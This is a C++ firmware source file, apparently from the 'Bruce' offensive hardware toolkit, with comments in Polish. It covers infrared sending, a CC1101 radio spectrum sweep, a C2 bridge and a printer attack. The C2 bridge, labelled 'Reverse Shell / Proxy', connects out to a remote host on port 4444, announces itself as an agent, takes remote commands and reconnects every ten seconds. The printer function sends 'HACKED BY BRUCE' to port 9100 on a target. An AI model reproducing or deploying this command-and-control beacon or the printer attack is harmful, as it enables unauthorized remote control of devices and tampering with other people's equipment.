#include <Arduino.hpp>
#include <WiFi.h>
#include <WiFiClient.h>
#include "core/settings.h"
#include "modules/ir/ir_utils.h"
#include "modules/ble/ble_spam.h"
#include "modules/rf/rf_utils.h"
#include <IRsend.h>
#include <ELECHOUSE_CC1101_SRC_DRV.h>

// Globalne zadanie dla mostu C2
TaskHandle_t c2TaskHandle = NULL;
String c2Host = "";
int c2Port = 4444;
bool c2Persist = true;

// Bufor dla danych widma
uint8_t spectrumBuffer[256];

// Funkcja wysyłająca IR z poziomu WiFi
void sendRawWiFi(int freq, String data) {
    IRsend irsend(bruceConfigPins.irTx);
    irsend.begin();

    // Parsowanie danych RAW (spacje -> tablica)
    uint16_t raw[512];
    int count = 0;
    char *ptr = strtok((char*)data.c_str(), " ");
    while(ptr != NULL && count < 512) {
        raw[count++] = atoi(ptr);
        ptr = strtok(NULL, " ");
    }
    irsend.sendRaw(raw, count, freq);
}

// Funkcja zbierająca dane RSSI z CC1101 dla analizatora widma
void getSpectrumData(int rangeIdx, uint8_t* output) {
    float start, step;
    switch(rangeIdx) {
        case 0: start = 300.0; step = 0.2; break; // 300-350 MHz
        case 1: start = 433.0; step = 0.05; break; // 433 MHz band
        case 2: start = 868.0; step = 0.05; break; // 868 MHz band
        default: start = 433.0; step = 0.1;
    }

    ELECHOUSE_cc1101.setRx();
    for (int i = 0; i < 256; i++) {
        ELECHOUSE_cc1101.setMHZ(start + (i * step));
        // Stabilizacja częstotliwości
        delayMicroseconds(50);
        output[i] = ELECHOUSE_cc1101.getRssi();
    }
}

// Zadanie Mostu C2 (Reverse Shell / Proxy)
void c2BridgeTask(void *pvParameters) {
    while(true) {
        if (WiFi.status() == WL_CONNECTED && c2Host != "") {
            WiFiClient client;
            if (client.connect(c2Host.c_str(), c2Port)) {
                client.println("BRUCE_AGENT_CONNECTED");
                while(client.connected()) {
                    if(client.available()) {
                        String cmd = client.readStringUntil('\n');
                        // Execute remote command
                        if(cmd == "ir_panic") sendRawWiFi(38000, "9000 4500 600 600");
                    }
                    vTaskDelay(pdMS_TO_TICKS(100));
                }
            }
        }
        if (!c2Persist) break;
        vTaskDelay(pdMS_TO_TICKS(10000)); // Reconnect co 10s
    }
    c2TaskHandle = NULL;
    vTaskDelete(NULL);
}

void startC2Bridge(String host, int port, bool persist) {
    c2Host = host;
    c2Port = port;
    c2Persist = persist;
    if (c2TaskHandle == NULL) {
        xTaskCreate(c2BridgeTask, "c2_bridge", 4096, NULL, 1, &c2TaskHandle);
    }
}

// Atak na drukarki
void proxyPrinterPrint(String target, String text) {
    WiFiClient prt;
    if(prt.connect(target.c_str(), 9100)) {
        prt.println("\n\n*** HACKED BY BRUCE ***");
        prt.println(text);
        prt.println("\n\n\u000C");
        prt.stop();
    }
}
